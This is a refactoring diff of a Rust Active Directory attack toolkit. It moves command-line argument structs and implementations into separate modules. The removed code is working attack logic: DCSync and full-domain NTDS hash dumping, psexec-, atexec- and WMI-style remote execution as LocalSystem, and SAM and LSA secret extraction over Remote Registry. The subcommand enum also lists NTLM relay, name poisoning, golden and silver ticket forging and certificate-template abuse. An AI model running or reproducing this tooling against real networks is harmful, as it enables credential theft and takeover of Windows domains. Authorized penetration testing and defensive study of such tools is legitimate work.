@@ -298,36 +298,36 @@ enum AttackCmd {
     /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
     Asktgt(attacks::asktgt::AsktgtArgs),
     /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
-    Dcsync(DcsyncArgs),
+    Dcsync(attacks::dcsync::DcsyncArgs),
     /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
     Capture(CaptureArgs),
     /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
     Poison(PoisonArgs),
     /// NTLM relay: SMB victim → LDAP/RBCD/AD CS Web (ESC8)/ICPR (ESC11). Pick with --target.
-    Relay(RelayArgs),
+    Relay(attacks::relay::RelayArgs),
     /// Remote command execution as LocalSystem over SVCCTL (psexec-style service create/run/delete).
-    Exec(ExecArgs),
+    Exec(attacks::exec_pack::ExecArgs),
     /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
-    Atexec(ExecArgs),
+    Atexec(attacks::exec_pack::ExecArgs),
     /// Remote command execution over WMI (DCOM → Win32_Process.Create), output captured over C$.
-    Wmiexec(ExecArgs),
+    Wmiexec(attacks::exec_pack::ExecArgs),
     /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
-    Secretsdump(SecretsdumpArgs),
+    Secretsdump(attacks::secretsdump::SecretsdumpArgs),
     /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
     Gmsa(attacks::gmsa::GmsaArgs),
     /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
     Laps(attacks::laps::LapsArgs),
     /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
-    Winrm(WinrmArgs),
+    Winrm(attacks::winrm_exec::WinrmArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
-    Esc1(Esc1Args),
+    Esc1(attacks::esc1::Esc1Args),
     /// ESC1 request marshaled via `ms-icpr`: build a CSR with an
     /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
     /// Sealed `\PIPE\cert` transport is not wired in this build — the command
     /// runs offline preflight + emits the marshaled bytes so the wire can be
     /// verified before a live submission.
     #[command(name = "icpr-esc1")]
-    IcprEsc1(IcprEsc1Args),
+    IcprEsc1(attacks::icpr_esc1::IcprEsc1Args),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
     Golden(attacks::golden::GoldenArgs),
     /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
@@ -339,7 +339,7 @@ enum AttackCmd {
     /// but emits a deprecation warning at runtime. The industry PTH acronym means
     /// *pass-the-hash*; `attack ptt` describes what this actually is.
     #[command(name = "ptt", visible_alias = "pth")]
-    Ptt(PthArgs),
+    Ptt(attacks::ptt::PthArgs),
     /// Find `TRUSTED_FOR_DELEGATION` hosts (non-DC) — unconstrained-delegation abuse targets.
     Unconstrained(ScanArgs),
     /// BadSuccessor (Server 2025 dMSA) — create a delegated MSA that succeeds a chosen victim.
@@ -370,162 +370,15 @@ struct DcshadowArgs {
     site: String,
 }
 
-#[derive(Parser)]
-struct PthArgs {
-    /// Target SMB host or IP (usually the DC).
-    #[arg(long)]
-    host: String,
-    /// KDC host or IP (for golden → TGS-REQ). Defaults to --host.
-    #[arg(long)]
-    kdc: Option<String>,
-    /// Kerberos realm (e.g. CORP.LOCAL).
-    #[arg(long)]
-    realm: String,
-    /// Domain SID (S-1-5-21-a-b-c).
-    #[arg(long)]
-    domain_sid: String,
-    /// Golden mode: krbtgt AES256 key (64 hex). Mutually exclusive with --service-aes256.
-    #[arg(long)]
-    krbtgt_aes256: Option<String>,
-    /// Silver mode: target service account AES256 key (64 hex).
-    #[arg(long)]
-    service_aes256: Option<String>,
-    /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
-    #[arg(long)]
-    rc4: bool,
-    /// Target SPN for the service ticket (default `cifs/<host>`).
-    #[arg(long)]
-    spn: Option<String>,
-    /// Identity to impersonate (default Administrator).
-    #[arg(long, default_value = "Administrator")]
-    user: String,
-    /// RID of the impersonated account (default 500).
-    #[arg(long, default_value_t = 500)]
-    rid: u32,
-    /// Group RIDs to embed.
-    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
-    groups: Vec<u32>,
-    /// Optional command to run as LocalSystem over the Kerberos-authenticated session.
-    #[arg(long)]
-    command: Option<String>,
-}
+// PthArgs moved to attacks::ptt in arch-0.
 
 // SilverArgs moved to attacks::silver in arch-0.
 
 // GoldenArgs moved to attacks::golden in arch-0.
 
-#[derive(clap::ValueEnum, Clone, Debug, PartialEq, Eq)]
-enum EscVariant {
-    /// Default: enrollee-supplies-subject → UPN SAN in the CSR.
-    Esc1,
-    /// SAN as CA `pctbAttribs` request-attribute — targets CAs with
-    /// `EDITF_ATTRIBUTESUBJECTALTNAME2` set on the CA (identify via `enum esc`).
-    Esc6,
-    /// EKUwu / CVE-2024-49019 — inject an EKU via Microsoft
-    /// `Application Policies` extension against a schema-v1 template.
-    Esc15,
-    /// CMC EnrollOnBehalfOf — wrap a target CSR + sign as an
-    /// Enrollment Agent (requires `--agent-cert` + `--agent-key`).
-    Esc3,
-}
+// EscVariant + IcprEsc1Args moved to attacks::icpr_esc1 in arch-0.
 
-#[derive(Parser)]
-struct IcprEsc1Args {
-    /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
-    #[arg(long)]
-    ca: String,
-    /// Certificate template `cn` that permits enrollee-supplied subject/SAN.
-    #[arg(long)]
-    template: String,
-    /// UPN to inject into the SAN (e.g. `administrator@corp.local`).
-    #[arg(long = "target-upn")]
-    target_upn: String,
-    /// Subject CN for the CSR (default: `Recon`).
-    #[arg(long, default_value = "Recon")]
-    subject: String,
-    /// PEM-encoded RSA private key path to sign the CSR with. If absent, a
-    /// fresh 2048-bit key is generated and written alongside the CSR.
-    #[arg(long)]
-    key: Option<String>,
-    /// Write the marshaled `CertServerRequest` stub bytes here (base64 skipped
-    /// — raw DCE/RPC input stub for offline diffing / relay).
-    #[arg(long, default_value = "icpr-esc1.stub")]
-    out: String,
-    /// Write the CSR DER here.
-    #[arg(long, default_value = "icpr-esc1.csr")]
-    csr_out: String,
-    /// Enrollment-agent schema-version override. ms-icpr's preflight rejects
-    /// templates with `min_ra_signatures > 0`; this flag forces a synthetic
-    /// override for lab-only testing when the LDAP fetch is unavailable.
-    #[arg(long)]
-    schema_version: Option<i32>,
-    /// CA host or IP for live submission via sealed \PIPE\cert. If omitted
-    /// the command runs offline (writes CSR + stub only, no submit).
-    #[arg(long)]
-    host: Option<String>,
-    /// NetBIOS domain for the sealed bind (required when --host is set).
-    #[arg(long)]
-    domain: Option<String>,
-    /// Username (required when --host is set).
-    #[arg(long)]
-    user: Option<String>,
-    /// Password (required when --host is set).
-    #[arg(long, default_value = "")]
-    password: String,
-
-    /// ESC variant to exercise. Default `esc1` = classic SAN-in-CSR.
-    #[arg(long, value_enum, default_value = "esc1")]
-    esc: EscVariant,
-    /// ESC6 SAN request-attribute UPN (defaults to `--target-upn`).
-    /// Only used when `--esc esc6` — the SAN is sent as a
-    /// `SAN:upn=<value>` line in the CA's `pctbAttribs` field.
-    #[arg(long)]
-    san_upn: Option<String>,
-    /// ESC3: PEM path of the Enrollment Agent's certificate.
-    /// Required with `--esc esc3`.
-    #[arg(long)]
-    agent_cert: Option<String>,
-    /// ESC3: PEM path of the Enrollment Agent's RSA private key.
-    /// Required with `--esc esc3`.
-    #[arg(long)]
-    agent_key: Option<String>,
-    /// ESC15: additional EKU OID to inject via Microsoft Application
-    /// Policies (default `1.3.6.1.5.5.7.3.2` = Client Authentication).
-    /// Only used when `--esc esc15`.
-    #[arg(long, default_value = "1.3.6.1.5.5.7.3.2")]
-    esc15_eku: String,
-}
-
-#[derive(Parser)]
-struct Esc1Args {
-    /// Target host or IP (the CA / DC)
-    #[arg(long)]
-    host: String,
-    #[arg(long)]
-    domain: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    /// CA name, e.g. corp-CA
-    #[arg(long)]
-    ca: String,
-    /// Vulnerable template name (enrollee-supplies-subject), e.g. VulnUser
-    #[arg(long)]
-    template: String,
-    /// UPN to impersonate via the SAN, e.g. Administrator@corp.local
-    #[arg(long)]
-    upn: String,
-    /// Output path for the issued cert (DER); the private key is written alongside as .key.pem
-    #[arg(long, default_value = "esc1.crt")]
-    out: String,
-    /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
-    #[arg(long)]
-    pkinit: bool,
-    /// KDC `host[:port]` for --pkinit (defaults to --host)
-    #[arg(long)]
-    kdc: Option<String>,
-}
+// Esc1Args moved to attacks::esc1 in arch-0.
 
 // GmsaArgs moved to attacks::gmsa in arch-0.
 
@@ -544,121 +397,13 @@ struct DnsArgs {
     insecure: bool,
 }
 
-#[derive(Parser)]
-struct WinrmArgs {
-    /// Target host or IP
-    #[arg(long)]
-    host: String,
-    /// WinRM port (5985 HTTP)
-    #[arg(long, default_value_t = 5985)]
-    port: u16,
-    /// NetBIOS or DNS domain (use "." or the host for a local account)
-    #[arg(long)]
-    domain: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long, default_value = "")]
-    password: String,
-    /// Pass-the-hash: NT hash (32 hex) instead of --password
-    #[arg(long)]
-    nt_hash: Option<String>,
-    /// Command to run (via cmd.exe /c)
-    #[arg(long)]
-    command: String,
-}
+// WinrmArgs moved to attacks::winrm_exec in arch-0.
 
-#[derive(Parser)]
-struct SecretsdumpArgs {
-    /// Target host or IP
-    #[arg(long)]
-    host: String,
-    /// NetBIOS or DNS domain
-    #[arg(long)]
-    domain: String,
-    /// Username (needs local admin on the target)
-    #[arg(long)]
-    user: String,
-    #[arg(long, default_value = "")]
-    password: String,
-    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
-    #[arg(long)]
-    nt_hash: Option<String>,
-}
+// SecretsdumpArgs moved to attacks::secretsdump in arch-0.
 
-#[derive(Parser)]
-struct ExecArgs {
-    /// Target host or IP
-    #[arg(long)]
-    host: String,
-    /// NetBIOS or DNS domain
-    #[arg(long)]
-    domain: String,
-    /// Username (needs local admin on the target for SVCCTL create)
-    #[arg(long)]
-    user: String,
-    #[arg(long, default_value = "")]
-    password: String,
-    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
-    #[arg(long)]
-    nt_hash: Option<String>,
-    /// Command to run (executed as `cmd.exe /Q /c <command>` under LocalSystem)
-    #[arg(long)]
-    command: String,
-}
+// ExecArgs moved to attacks::exec_pack in arch-0.
 
-/// Post-relay write action for `attack relay`.
-///
-/// This is the *CLI selector* for what to do with the relayed victim's
-/// session; the internal data-carrying enum below is [`RelayAction`],
-/// which additionally carries resolved CA host/port/template/insecure
-/// for the ADCS/ICPR variants.
-#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
-pub enum RelayTarget {
-    /// Shadow Credentials: write msDS-KeyCredentialLink on the target object.
-    LdapKeycred,
-    /// RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target object.
-    LdapRbcd,
-    /// ESC8: HTTP relay to AD CS web enrollment — needs --ca-host.
-    AdcsHttp,
-    /// ESC11: relay to MS-ICPR over ncacn_ip_tcp — needs --ca-host.
-    Icpr,
-}
-
-#[derive(Parser)]
-struct RelayArgs {
-    /// SMB address to receive the coerced/poisoned victim on
-    #[arg(long, default_value = "0.0.0.0:445")]
-    listen: String,
-    /// Target DC to relay the victim's auth to (LDAP :389)
-    #[arg(long)]
-    target_dc: String,
-    /// AD DNS domain, for the base DN (e.g. corp.local)
-    #[arg(long)]
-    realm: String,
-    /// Object (sAMAccountName) to write on, as the relayed victim
-    #[arg(long)]
-    target_object: String,
-    /// Relay target: `ldap-keycred` (Shadow Cred), `ldap-rbcd` (RBCD write),
-    /// `adcs-http` (ESC8), `icpr` (ESC11) — both need --ca-host.
-    #[arg(long, value_enum, default_value_t = RelayTarget::LdapKeycred)]
-    target: RelayTarget,
-    /// For `ldap-rbcd`: SID of the account we control that will be granted delegation rights
-    /// (typically a computer account we created — required if --target=ldap-rbcd).
-    #[arg(long)]
-    trustee_sid: Option<String>,
-    /// For `adcs-http` (ESC8): CA web-enrollment host (e.g. `ca.corp.local`).
-    #[arg(long)]
-    ca_host: Option<String>,
-    /// For `adcs-http`: CA template to request (default `User`).
-    #[arg(long, default_value = "User")]
-    ca_template: String,
-    /// For `adcs-http`: HTTPS port (default 443; use 80 with `--ca-scheme http`).
-    #[arg(long, default_value_t = 443)]
-    ca_port: u16,
-    /// For `adcs-http`: skip TLS cert verification (self-signed / internal CA is the norm).
-    #[arg(long, default_value_t = true)]
-    ca_insecure: bool,
-}
+// RelayTarget + RelayArgs moved to attacks::relay in arch-0.
 
 #[derive(Parser)]
 struct PoisonArgs {
@@ -674,35 +419,7 @@ struct CaptureArgs {
     listen: String,
 }
 
-#[derive(Parser)]
-struct DcsyncArgs {
-    /// DC host or IP
-    #[arg(long)]
-    host: String,
-    /// NetBIOS domain, e.g. CORP
-    #[arg(long)]
-    domain: String,
-    /// Username (needs replication rights for a real sync)
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
-    #[arg(long)]
-    target: Option<String>,
-    /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
-    #[arg(long)]
-    all: bool,
-    /// Confirm bulk (`--all`) runs non-interactively. Required when stdout is a TTY
-    /// and `--all` is set; ignored otherwise. Blocks accidental full-domain dumps from
-    /// a fat-fingered flag.
-    #[arg(long)]
-    yes: bool,
-    /// Cap the bulk (`--all`) run at N accounts. Useful for smoke-testing --all against a
-    /// large domain before committing to a full dump.
-    #[arg(long)]
-    limit: Option<usize>,
-}
+// DcsyncArgs moved to attacks::dcsync in arch-0.
 
 // AsktgtArgs moved to `attacks::asktgt` in arch-0.
 
@@ -895,21 +612,21 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Rbcd(a)) => attacks::rbcd::rbcd(a).await,
         Command::Attack(AttackCmd::Constrained(a)) => attacks::rbcd::rbcd(a).await,
         Command::Attack(AttackCmd::Asktgt(a)) => attacks::asktgt::asktgt(a).await,
-        Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
+        Command::Attack(AttackCmd::Dcsync(a)) => attacks::dcsync::dcsync(a).await,
         Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
             .await
             .map_err(Into::into),
         Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
-        Command::Attack(AttackCmd::Relay(a)) => relay(a).await,
-        Command::Attack(AttackCmd::Exec(a)) => exec_cmd(a).await,
-        Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
-        Command::Attack(AttackCmd::Wmiexec(a)) => wmiexec_cmd(a).await,
-        Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
+        Command::Attack(AttackCmd::Relay(a)) => attacks::relay::relay(a).await,
+        Command::Attack(AttackCmd::Exec(a)) => attacks::exec_pack::exec_cmd(a).await,
+        Command::Attack(AttackCmd::Atexec(a)) => attacks::exec_pack::atexec_cmd(a).await,
+        Command::Attack(AttackCmd::Wmiexec(a)) => attacks::exec_pack::wmiexec_cmd(a).await,
+        Command::Attack(AttackCmd::Secretsdump(a)) => attacks::secretsdump::secretsdump(a).await,
         Command::Attack(AttackCmd::Gmsa(a)) => attacks::gmsa::gmsa(a).await,
         Command::Attack(AttackCmd::Laps(a)) => attacks::laps::laps(a).await,
-        Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
-        Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
-        Command::Attack(AttackCmd::IcprEsc1(a)) => icpr_esc1(a).await,
+        Command::Attack(AttackCmd::Winrm(a)) => attacks::winrm_exec::winrm_exec(a).await,
+        Command::Attack(AttackCmd::Esc1(a)) => attacks::esc1::esc1(a).await,
+        Command::Attack(AttackCmd::IcprEsc1(a)) => attacks::icpr_esc1::icpr_esc1(a).await,
         Command::Attack(AttackCmd::Golden(a)) => attacks::golden::golden(a).await,
         Command::Attack(AttackCmd::Silver(a)) => attacks::silver::silver(a).await,
         Command::Attack(AttackCmd::Ptt(a)) => {
@@ -920,9 +637,11 @@ async fn dispatch(cmd: Command) -> Result<()> {
                      use `attack ptt` (pass-the-ticket). Alias will be removed in 1.5.0."
                 );
             }
-            pth(a).await
+            attacks::ptt::pth(a).await
         }
-        Command::Attack(AttackCmd::Unconstrained(a)) => attacks::unconstrained::unconstrained(a).await,
+        Command::Attack(AttackCmd::Unconstrained(a)) => {
+            attacks::unconstrained::unconstrained(a).await
+        }
         Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
         Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
         Command::Attack(AttackCmd::Shadowcred(a)) => attacks::shadowcred::shadowcred(a).await,
@@ -952,38 +671,8 @@ async fn dispatch(cmd: Command) -> Result<()> {
 // fn rbcd moved to attacks::rbcd in arch-0.
 
 // fn asktgt moved to `attacks::asktgt` in arch-0.
-/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
-async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use ms_drsr::DrsSession;
+// fn dcsync moved to attacks::dcsync in arch-0.
 
-    if a.all {
-        return dcsync_all(&a).await;
-    }
-    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
-    match a.target {
-        None => {
-            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
-            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
-        }
-        Some(t) => {
-            let (rid, nt, kerb) = sess.dcsync(&a.domain, &t).await?;
-            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
-            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
-            println!(
-                "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
-                t, rid, nthex
-            );
-            // Kerberos keys (secretsdump-style): user:etype:hexkey
-            for k in &kerb {
-                println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
-            }
-        }
-    }
-    Ok(())
-}
-
-/// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each — the
 /// `enum sessions` — enumerate a host's logon sessions over SRVSVC (session hunting). Each row is
 /// a (user, client computer) pair; a privileged user here marks the host as a credential-theft
 /// target, i.e. a `HasSession` edge into that user.
@@ -1134,74 +823,8 @@ async fn hku_enum(mut a: SessionsArgs) -> Result<()> {
     Ok(())
 }
 
-/// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
-/// (which now reassembles multi-fragment replies, so large/computer accounts work too).
-async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
-    use dcerpc::samr::SamrClient;
-    use ms_drsr::DrsSession;
-    use smb2_client::SmbClient;
+// fn dcsync_all moved to attacks::dcsync in arch-0.
 
-    // 1. enumerate accounts via SAMR-over-SMB.
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let pipe = smb.open_pipe("samr").await?;
-    let mut samr = SamrClient::bind(&mut smb, pipe).await?;
-    let mut users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
-
-    // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
-    // every account in the domain; require --yes when we can see the operator's
-    // TTY. Non-TTY callers (CI / piped runs) bypass the prompt.
-    use std::io::IsTerminal as _;
-    if !a.yes && std::io::stdout().is_terminal() {
-        anyhow::bail!(
-            "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
-             confirm, or use --limit N for a scoped run first.",
-            users.len(),
-            a.host
-        );
-    }
-
-    if let Some(n) = a.limit {
-        if users.len() > n {
-            eprintln!(
-                "[*] --limit {n} — capping bulk run at {n} of {} enumerated accounts",
-                users.len()
-            );
-            users.truncate(n);
-        }
-    }
-
-    eprintln!("[+] {} accounts scheduled for replication…", users.len());
-
-    // 2. DCSync each over one sealed DRSUAPI session.
-    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
-    let (mut ok, mut fail) = (0u32, 0u32);
-    for (_rid, name) in &users {
-        match sess.dcsync(&a.domain, name).await {
-            Ok((rid, nt, kerb)) => {
-                let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
-                println!(
-                    "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
-                    name, rid, nthex
-                );
-                for k in &kerb {
-                    println!("{}:{}:{}", name, k.etype_name(), hex::encode(&k.key));
-                }
-                ok += 1;
-            }
-            Err(e) => {
-                tracing::warn!("dcsync {name} failed: {e}");
-                fail += 1;
-            }
-        }
-    }
-    eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
-    Ok(())
-}
-
-/// Remote code execution over SVCCTL: create a LocalSystem service running the command, start
-/// it, delete it. Blind (no output) — pair with a listener or redirect to a share for results.
 /// Resolve a credential-flag value that came in through argv. If the operator
 /// passed an empty `--password` / `--nt-hash` (the recommended way to avoid the
 /// `ps` / shell-history leak), we fall back to the matching env var — currently
@@ -1351,627 +974,29 @@ pub(crate) async fn smb_login(
     Ok(())
 }
 
-async fn exec_cmd(mut a: ExecArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use smb2_client::SmbClient;
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let r = dcerpc::svcctl::exec(&mut smb, &a.host, &a.command).await?;
-    let clean = if r.cleaned {
-        "service cleaned up"
-    } else {
-        "SERVICE NOT DELETED"
-    };
-    if r.ran {
-        println!(
-            "[+] executed as LocalSystem (service '{}', start win32 {}); {clean}",
-            r.service, r.start_win32
-        );
-    } else {
-        println!("[-] service '{}' created but start returned win32 {} (command may not have run); {clean}", r.service, r.start_win32);
-    }
-    match r.output {
-        Some(o) if !o.is_empty() => println!("\n{o}"),
-        Some(_) => println!("[*] command produced no output"),
-        None => println!("[*] output not captured (see warnings; command may still have run)"),
-    }
-    Ok(())
-}
+// fn exec_cmd moved to attacks::exec_pack in arch-0.
 
-/// wmiexec: remote code execution over WMI (DCOM `Win32_Process.Create`). The process runs detached
-/// under WmiPrvSE, so the command is redirected to a temp file and read back over C$ — no service or
-/// scheduled task is created (distinct host telemetry from `exec`/`atexec`).
-async fn wmiexec_cmd(mut a: ExecArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use smb2_client::SmbClient;
-    let hash = a.nt_hash.as_deref().map(parse_nt_hash).transpose()?;
-    anyhow::ensure!(
-        !a.password.is_empty() || hash.is_some(),
-        "provide --password or --nt-hash"
-    );
-    // Unique output path under C:\Windows\Temp, redirected inside a cmd wrapper.
-    let tag = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.as_millis() as u64)
-        .unwrap_or(0)
-        & 0xff_ffff;
-    let out_rel = format!("Windows\\Temp\\ADHwmi{tag:06x}.out");
-    let out_abs = format!("C:\\{out_rel}");
-    let wrapped = format!("cmd.exe /Q /c {} > {out_abs} 2>&1", a.command);
+// fn wmiexec_cmd moved to attacks::exec_pack in arch-0.
 
-    let hr = dcerpc::dcom_wmi::wmi_exec(
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        hash.as_ref(),
-        "ADHAMMER",
-        &wrapped,
-    )
-    .await?;
-    if hr != 0 {
-        crate::ui::warn(&format!(
-            "Win32_Process.Create returned HRESULT 0x{:08x} (command may not have run)",
-            hr as u32
-        ));
-    } else {
-        crate::ui::ok("process created via WMI (Win32_Process.Create)");
-    }
+// fn atexec_cmd moved to attacks::exec_pack in arch-0.
 
-    // The process is detached — poll-read the output file over C$ until it lands.
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
-    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
-    let mut out = None;
-    for _ in 0..24 {
-        match smb.read_file_delete(&out_rel).await {
-            Ok(b) => {
-                out = Some(b);
-                break;
-            }
-            Err(_) => tokio::time::sleep(std::time::Duration::from_millis(300)).await,
-        }
-    }
-    match out {
-        Some(b) if !b.is_empty() => {
-            let s = String::from_utf8_lossy(&b);
-            println!("\n{}", s.trim_end());
-        }
-        Some(_) => crate::ui::info("command produced no output"),
-        None => crate::ui::info("output not captured (command may still have run)"),
-    }
-    Ok(())
-}
+// fn secretsdump moved to attacks::secretsdump in arch-0.
 
-/// atexec: remote code execution as LocalSystem via a scheduled task (MS-TSCH), with output
-/// captured over C$. Alternative to `exec` (SVCCTL) — different host telemetry.
-async fn atexec_cmd(mut a: ExecArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use smb2_client::SmbClient;
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
+// fn print_lsa_secret moved to attacks::secretsdump in arch-0.
 
-    let tag = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.subsec_nanos())
-        .unwrap_or(0);
-    let out_rel = format!("Windows\\Temp\\ADhat{tag:08x}.out");
-    let full = format!("{} > C:\\{out_rel} 2>&1", a.command);
-
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let (path, run_hr) =
-        dcerpc::tsch::atexec(&mut smb, &full, &a.domain, &a.user, &a.password, &a.host).await?;
-    println!("[+] scheduled task {path} registered + run as LocalSystem (run HRESULT 0x{run_hr:08x}); deleted");
-
-    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
-    match smb.read_file_delete(&out_rel).await {
-        Ok(b) if !b.is_empty() => println!(
-            "\n{}",
-            String::from_utf8_lossy(&b).replace('\r', "").trim_end()
-        ),
-        Ok(_) => println!("[*] command produced no output"),
-        Err(e) => println!("[*] output not captured: {e}"),
-    }
-    Ok(())
-}
-
-/// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
-/// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
-async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use smb2_client::SmbClient;
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-
-    // Fast path: pull the bootkey directly via MS-RRP (WINREG API). Four tiny RPC
-    // roundtrips for the Lsa\{JD,Skew1,GBG,Data} key CLASS NAMES — no `reg save HKLM\SYSTEM`,
-    // no 15 MB hive download, no polling. Only falls back to the hive-save path if the
-    // Remote Registry service is unreachable.
-    // Fast path: full RRP secretsdump (bootkey + SAM users + LSA secrets) — no `reg save`
-    // anywhere. Falls back to the hive-save path if Remote Registry is off or any RRP step fails.
-    let mut rrp_sam: Option<Vec<adhammer_secrets::SamAccount>> = None;
-    let mut rrp_lsa: Option<Vec<adhammer_secrets::LsaSecret>> = None;
-    let bootkey_rrp = {
-        let mut reg = match dcerpc::rrp::RegistryClient::connect(
-            &mut smb,
-            &a.domain,
-            &a.user,
-            &a.password,
-            &a.host,
-        )
-        .await
-        {
-            Ok(r) => Some(r),
-            Err(e) => {
-                eprintln!(
-                    "[!] Remote Registry unreachable ({e}) — falling back to `reg save` hives"
-                );
-                None
-            }
-        };
-        match reg.as_mut() {
-            Some(r) => {
-                // Open HKLM once and reuse it across all three RRP calls — saves 4 RPC
-                // roundtrips (2 opens + 2 closes) versus opening HKLM inside each helper.
-                match r.hklm().await {
-                    Ok(hklm) => {
-                        let bk_res = adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
-                        let bk_opt = match bk_res {
-                            Ok(bk) => {
-                                eprintln!(
-                                    "[+] bootkey via RRP: {}",
-                                    bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
-                                );
-                                if let Ok(users) =
-                                    adhammer_secrets::dump_sam_via_rrp_hklm(r, &hklm, &bk).await
-                                {
-                                    eprintln!("[+] SAM via RRP: {} account(s)", users.len());
-                                    rrp_sam = Some(users);
-                                }
-                                if let Ok(secrets) =
-                                    adhammer_secrets::dump_lsa_via_rrp_hklm(r, &hklm, &bk).await
-                                {
-                                    eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
-                                    rrp_lsa = Some(secrets);
-                                }
-                                Some(bk)
-                            }
-                            Err(e) => {
-                                eprintln!(
-                                    "[!] RRP bootkey failed ({e}) — falling back to `reg save` hives"
-                                );
-                                None
-                            }
-                        };
-                        r.close_handle(&hklm).await;
-                        bk_opt
-                    }
-                    Err(e) => {
-                        eprintln!(
